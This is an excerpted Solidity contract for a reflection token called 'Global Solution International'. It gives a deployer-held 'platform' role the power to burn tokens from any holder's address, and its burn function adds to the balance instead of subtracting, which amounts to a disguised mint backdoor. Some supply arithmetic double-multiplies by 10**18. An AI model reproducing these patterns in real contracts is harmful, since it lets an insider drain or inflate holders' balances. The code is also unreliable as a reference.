...
contract GlobalSolutionInternational is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 74_595_238 * 10 ** 18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Global Solution International";
    ...
    uint256 public _maxTxAmount = _tTotal / 100 * 10 ** 18;
    uint256 private numTokensSellToAddToLiquidity = _tTotal / 250 * 10 ** 18;
    ...
    modifier onlyPlatform {
        require (_msgSender() == _platform, "Only callable by the platform address");
        _;
    }
    
    constructor () {
        _rOwned[_msgSender()] = _rTotal;
        _platform = _msgSender();
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // Was 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F
    ...
    function setPlatform (address platform) external onlyPlatform {
        require (platform != address(0), "Can't set to the zero address");
    ...
    function burn (address from, uint256 amount) external onlyPlatform {
        require (from != address(0), "Can't burn from zero address");
        uint256 currentRate = _getRate();
        uint256 rAmount = amount.mul(currentRate);
        ...
        _rOwned[from] = _rOwned[from].add(rAmount);
